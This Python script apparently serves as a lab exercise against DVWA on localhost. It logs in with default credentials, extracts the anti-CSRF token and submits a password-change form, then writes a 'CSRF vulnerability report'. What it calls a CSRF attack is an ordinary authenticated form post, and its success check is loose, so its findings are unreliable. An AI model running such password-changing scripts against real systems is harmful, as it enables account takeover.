import requests
from bs4 import BeautifulSoup

# Configuration
DVWA_URL = 'http://localhost/dvwa/'
LOGIN_URL = 'http://localhost/dvwa/login.php'
CSRF_VULN_URL = 'http://localhost/dvwa/vulnerabilities/csrf/'
REPORT_FILE = 'csrf_vulnerability_report.txt'

# DVWA Credentials
USERNAME = 'admin'
PASSWORD = 'password'
NEW_PASSWORD = 'newpassword123'

def login_to_dvwa():
    session = requests.Session()
    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    
    # Extract CSRF token
    csrf_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None

    if not csrf_token:
        print('CSRF token not found in the login page HTML')
        return None

    # Login data
    login_data = {
        'username': USERNAME,
        'password': PASSWORD,
        'Login': 'Login',
        'user_token': csrf_token
    }

    # Perform login
    response = session.post(LOGIN_URL, data=login_data)
    
    if 'Login failed' in response.text:
        print('Login failed')
        return None
    
    return session

def perform_csrf_attack(session, url, form_data):
    # Get the page content
    response = session.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Extract CSRF token
    csrf_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None

    if not csrf_token:
        print(f'CSRF token not found in {url}')
        return url, 'CSRF token not found', False

    # Add CSRF token to form data
    form_data['user_token'] = csrf_token

    # Perform the CSRF attack
    response = session.post(url, data=form_data)
    
    if 'CSRF token is incorrect' in response.text or 'password is incorrect' in response.text:
        return url, 'CSRF token is incorrect or operation failed', False
    else:
        return url, 'CSRF attack successful', True

def write_report(results):
    with open(REPORT_FILE, 'w') as report_file:
        report_file.write('DVWA CSRF Vulnerability Report\n')
        report_file.write('='*40 + '\n')

        for url, (test_scenario, success) in results.items():
            report_file.write(f'Target URL: {url}\n')
            report_file.write(f'Test Scenario: {test_scenario}\n')
            report_file.write(f'Success: {success}\n')
            report_file.write('='*40 + '\n\n')

def run_csrf_vulnerability_tests():
    session = login_to_dvwa()

    if not session:
        return

    results = {}

    # CSRF attack scenarios
    csrf_attack_scenarios = [
        {'url': CSRF_VULN_URL, 'data': {'password_current': '', 'password_new': NEW_PASSWORD, 'password_conf': NEW_PASSWORD}},
        # You can add more scenarios with different form data as needed
    ]

    for scenario in csrf_attack_scenarios:
        url = scenario['url']
        form_data = scenario['data']
        target_url, test_scenario, success = perform_csrf_attack(session, url, form_data)
        results[url] = (test_scenario, success)

    session.close()
    write_report(results)
    print(f'Report generated: {REPORT_FILE}')

# Entry point of the script
if __name__ == '__main__':
    run_csrf_vulnerability_tests()
